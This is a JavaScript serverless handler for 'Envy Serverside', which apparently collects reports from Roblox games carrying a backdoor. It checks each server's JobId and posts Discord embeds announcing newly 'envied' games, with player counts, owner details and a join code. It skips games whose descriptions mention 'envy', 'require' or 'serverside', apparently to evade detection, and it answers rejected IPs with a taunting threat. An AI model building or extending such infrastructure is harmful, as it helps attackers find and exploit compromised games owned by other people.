const { Redis } = require('ioredis');
const { Address4, Address6 } = require('ip-address');


/*
async function cleanupStaleGames(redis, REAL_WEBHOOK_URL) {
    const STALE_GAME_SECONDS = 30 * 60; // Clean up if half an hour passed without a game update.
    const currentTime = Math.floor(Date.now() / 1000);
    let deletedCount = 0;
    
    try {
        const gameKeys = await redis.keys('game:*');
        if (gameKeys.length === 0) return;
    
        const gameDataArray = await redis.mget(...gameKeys);
    
        for (let i = 0; i < gameKeys.length; i++) {
            const key = gameKeys[i];
            const rawData = gameDataArray[i];

            if(!rawData) continue;

            try
            {
                const data = JSON.parse(rawData);
                if (data && data.timestamp && (currentTime - data.timestamp > STALE_GAME_SECONDS)) {
                    console.log(`Cleanup: Found stale game ${key}. Deleting...`);
                    const deleteUrl = `${REAL_WEBHOOK_URL}/messages/${data.messageId}`;
                    fetch(deleteUrl, { method: 'DELETE' }).catch(e => {console.log(`Failed to delete message ${data.messageId}:`, e)}); // Fire and forget
                    await redis.del(key);
                    deletedCount++;
                }
            } catch(e) {
                console.error(`Cleanup: Failed to parse data for key ${key}:`, rawData);
            }
        }
        if (deletedCount > 0) console.log(`Cleanup complete. Deleted ${deletedCount} stale game(s).`);
    } catch (error) {
        console.error("Background Cleanup Error:", error);
    }
}
*/

async function fetchGameInfo(placeId) {
    try {
        // First, get universe ID from place ID
        const universeResponse = await fetch(
            `https://apis.roblox.com/universes/v1/places/${placeId}/universe`,
            { headers: { 'User-Agent': 'Agent-E' } }
        );
        if (!universeResponse.ok) {
            const errorText = await universeResponse.text();
            console.error("Universe fetch error:", errorText);
            throw new Error('Failed to fetch universe ID');
        } 
        const universeData = await universeResponse.json();
        const universeId = universeData.universeId;

        // Fetch game details
        const gameResponse = await fetch(
            `https://games.roblox.com/v1/games?universeIds=${universeId}`,
            { headers: { 'User-Agent': 'Agent-E' } }
        );
        if (!gameResponse.ok) {
            const errorText = await gameResponse.text();
            console.error("Game fetch error:", errorText);
            throw new Error('Failed to fetch game info');
        }
        const gameData = await gameResponse.json();
        const gameInfo = gameData.data[0];

        // Fetch thumbnail
        let thumbnail = "https://tr.rbxcdn.com/31c19d85d08e6c3e7f20d88c614f06cb/512/512/Image/Png";
        try {
            const thumbResponse = await fetch(
                `https://thumbnails.roblox.com/v1/games/icons?universeIds=${universeId}&size=512x512&format=Png`,
                { headers: { 'User-Agent': 'Agent-E' } }
            );
            if (thumbResponse.ok) {
                const thumbData = await thumbResponse.json();
                if (thumbData.data && thumbData.data[0]) {
                    thumbnail = thumbData.data[0].imageUrl;
                }
            }
        } catch (e) {
            console.error("Thumbnail fetch error:", e);
        }

        return { gameInfo, universeId, thumbnail };
    } catch (error) {
        console.error("Error fetching game info:", error);
        throw error;
    }
}

function formatNumber(n) {
    n = parseInt(n);
    if (isNaN(n)) return "Unknown";
    return n >= 1e6 ? `${(n / 1e6).toFixed(1)}M`
        : n >= 1e3 ? `${(n / 1e3).toFixed(1)}K`
        : n.toString();
}

function formatDate(dateString) {
    try {
        const date = new Date(dateString);
        const now = new Date();
        const diffMs = now - date;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
        const diffMinutes = Math.floor(diffMs / (1000 * 60));

        // Format absolute date
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        const year = date.getFullYear();
        const absoluteDate = `${month}/${day}/${year}`;

        // Format relative time
        let relativeTime;
        if (diffMinutes < 60) {
            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
        } else if (diffHours < 24) {
            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
        } else if (diffDays < 30) {
            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
        } else if (diffDays < 365) {
            const months = Math.floor(diffDays / 30);
            relativeTime = `${months} month${months !== 1 ? 's' : ''} ago`;
        } else {
            const years = Math.floor(diffDays / 365);
            relativeTime = `${years} year${years !== 1 ? 's' : ''} ago`;
        }

        return `${relativeTime} (${absoluteDate})`;
    } catch (e) {
        return "Unknown";
    }
}


function createDiscordEmbed(gameInfo, placeId, thumbnail, JobId, isNonHttp = false) {
    let creator = "";
    if (gameInfo.creator.type === "User") {
        creator = `**Owner**: [${gameInfo.creator.name}](https://www.roblox.com/users/${gameInfo.creator.id || 0}/profile)\n` +
                  `**ID**: \`${gameInfo.creator.id}\`\n` +
                  `**Verified**: \`${gameInfo.creator.hasVerifiedBadge}\``;
    } else {
        creator = `**Owner**: [${gameInfo.creator.name}](https://www.roblox.com/communities/${gameInfo.creator.id || 0})`;
    }

    return {
        content: "",
        username: "Envy Messenger",
        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
        embeds: [{
            title: gameInfo.name,
            url: `https://www.roblox.com/games/${placeId}`,
            color: parseInt("0x8200c8", 16),
            author: {
                name: "A new game has been envied!",
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png"
            },
            thumbnail: { url: thumbnail },
            fields: [
                {
                    name: "> **Game Information**",
                    value: `**Players**: \`${gameInfo.playing}\`\n` +
                           `**Server Size**: \`${gameInfo.maxPlayers || "Unknown"}\`\n` +
                           `**Visits**: \`${formatNumber(gameInfo.visits)}\`\n` +
                           `**Favorites**: \`${formatNumber(gameInfo.favoritedCount)}\`\n` +
                           `**Genre**: \`${gameInfo.genre}\`\n` +
                           `**Description**: ${gameInfo.description || "No description"}\n` +
                           `**Last Game Update**: \`${formatDate(gameInfo.updated)}\`\n` +
                           `[DEBUG]-> JobId: \`\`\`${JobId}\`\`\``+ (isNonHttp ?  
                           `\n**WARNING**: This game is non-HTTP Enabled and may provide inaccurate data.` : ""),
                    inline: true
                },
                {
                    name: "> **Owner Information**",
                    value: creator,
                    inline: true
                },
                {
                    name: "**Javascript Join Code**",
                    value: `\`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "")\n\`\`\``,
                    inline: false
                }
            ],
            footer: {
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
                text: "Envy Serverside"
            },
            timestamp: new Date().toISOString()
        }]
    };
}

async function isJobIdAuthentic(placeId, targetJobId) {
    const apiUrl = 'https://gamejoin.roblox.com/v1/join-game-instance';
    try {
        const apiResponse = await fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Roblox/WinInet' },
            body: JSON.stringify({ placeId: placeId, gameId: targetJobId })
        });
        return apiResponse.status < 500;
    } catch (error) {
        console.error("Error during JobId authentication:", error);
        return false;
    }
}




exports.handler = async (event) => {
    // --- Protection
    const clientIp = event.headers['x-nf-client-connection-ip'];
    if (!clientIp) {
        return { statusCode: 403, body: 'Forbidden: Could not determine client IP address.' };
    }
    
    // --- Environment and Connection Setup ---
    const redis = new Redis(process.env.AIVEN_VALKEY_URL);
    const REAL_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    const SECRET_HEADER = process.env.SECRET_HEADER_KEY;
    const AUTH_CACHE_EXPIRATION_SECONDS = 300;


    // --- Contineum of Protection ---
    
    let activeIpRanges;
    try {
        const dynamicRangesJson = await redis.get('roblox_ip_ranges');
        if (dynamicRangesJson) {
            activeIpRanges = JSON.parse(dynamicRangesJson);
        }
    } catch (e) {
        console.error("Could not get IP list from Redis.", e);
    }

    const isIpFromRoblox = activeIpRanges.some(range => {
        try { return Address4.fromCidr(range).contains(clientIp); }
        catch (e) {
            try { return Address6.fromCidr(range).contains(clientIp); }
            catch (e2) { return false; }
        }
    });
    if (!isIpFromRoblox) {
        console.warn(`Rejected request from non-Roblox IP: ${clientIp}`);
        return { statusCode: 403, body: 'L33t: your Ip has been compromised. We are gonna get you.' };
    }
    
    // --- 1. Request Validation ---
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed.' };
    }
    if (event.headers['x-secret-header'] !== SECRET_HEADER) {
        return { statusCode: 401, body: 'Unauthorized' };
    }
    if (event.headers['user-agent'] !== "Roblox/Linux") {
        return { statusCode: 400, body: 'Access Denied.' };
    }

    // --- 2. Data Extraction and Validation ---
    const body = JSON.parse(event.body);
    const robloxIdHeader = event.headers['roblox-id'];
    let placeId;

    if (!robloxIdHeader || robloxIdHeader === "0") {
        return { statusCode: 400, body: 'Bad Request: Missing or invalid roblox-id header.' };
    }

    const placeIdMatch = robloxIdHeader.match(/placeId=(\d+)/);
    if (placeIdMatch) {
        placeId = placeIdMatch[1];
    } else if (/^\d+$/.test(robloxIdHeader)) {
        placeId = robloxIdHeader;
    } else {
        return { statusCode: 400, body: 'Bad Request: 1337' };
    }

    const jobId = body.jobId;
    if (!jobId || !placeId) {
        return { statusCode: 400, body: 'Bad Request: 1336' };
    }

    try {
        // --- 3. JobId Authentication & Caching ---
        const authCacheKey = `auth:${jobId}`;
        const isAlreadyAuthenticated = await redis.get(authCacheKey);

        if (!isAlreadyAuthenticated) {
            const isAuthentic = await isJobIdAuthentic(placeId, jobId);
            if (!isAuthentic) {
                console.warn(`Rejected unauthenticated JobId: ${jobId}`);
                return { statusCode: 403, body: 'Forbidden: JobId authentication failed.' };
            }
            await redis.set(authCacheKey, 'true', 'EX', AUTH_CACHE_EXPIRATION_SECONDS);
        }

        // --- 4. Rate Limiting ---
        const rateLimitKey = `rate:${jobId}`;
        const currentRequests = await redis.incr(rateLimitKey);
        if (currentRequests === 1) {
            await redis.expire(rateLimitKey, 60);
        }
        if (currentRequests > 20) {
            return { statusCode: 429, body: 'Too Many Requests' };
        }

        // --- 5. Core Logic ---
        const { gameInfo, universeId, thumbnail } = await fetchGameInfo(placeId);
        const gameKey = `game:${universeId}`;
        const rawGameData = await redis.get(gameKey);
        const gameData = rawGameData ? JSON.parse(rawGameData) : null;
        let messageId = gameData ? gameData.messageId : null;
        const currentTime = Math.floor(Date.now() / 1000);

        // Skip or delete if game is empty or has a filtered description
        if (gameInfo.playing === 0 || gameInfo.description?.includes("envy") || gameInfo.description?.includes("require") || gameInfo.description?.includes("serverside")) {
            if (messageId) {
                await fetch(`${REAL_WEBHOOK_URL}/messages/${messageId}`, { method: 'DELETE' });
                await redis.del(gameKey);
            }
            return { statusCode: 200, body: JSON.stringify({ success: true, action: 'skipped_or_deleted' }) };
        }

        const payload = createDiscordEmbed(gameInfo, placeId, thumbnail, jobId, false);
        const headers = { 'Content-Type': 'application/json', 'User-Agent': 'Agent-E' };

        // --- 6. Discord Message Handling (Create/Edit) ---
        if (messageId) {
            const editUrl = `${REAL_WEBHOOK_URL}/messages/${messageId}`;
            const editResponse = await fetch(editUrl, { method: 'PATCH', headers, body: JSON.stringify(payload) });

            if (!editResponse.ok && editResponse.status === 404) {
                // Message was deleted on Discord, so recreate it
                messageId = null; 
            }
        }
        
        if (!messageId) {
            const createUrl = `${REAL_WEBHOOK_URL}?wait=true`;
            const createResponse = await fetch(createUrl, { method: 'POST', headers, body: JSON.stringify(payload) });
            if (!createResponse.ok) {
                throw new Error(`Discord API Error on POST: ${createResponse.status}`);
            }
            const responseData = await createResponse.json();
            messageId = responseData.id;
        }

        // --- 7. Update Redis State and Respond ---
        const newGameData = { messageId: messageId, timestamp: currentTime, placeId: placeId };
        await redis.set(gameKey, JSON.stringify(newGameData));

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, messageId: messageId })
        };

    } catch (error) {
        console.error("Main Handler Error:", error);
        return {
            statusCode: 500,
            body: `Internal Server Error: ${error.message}`
        };
    }
};
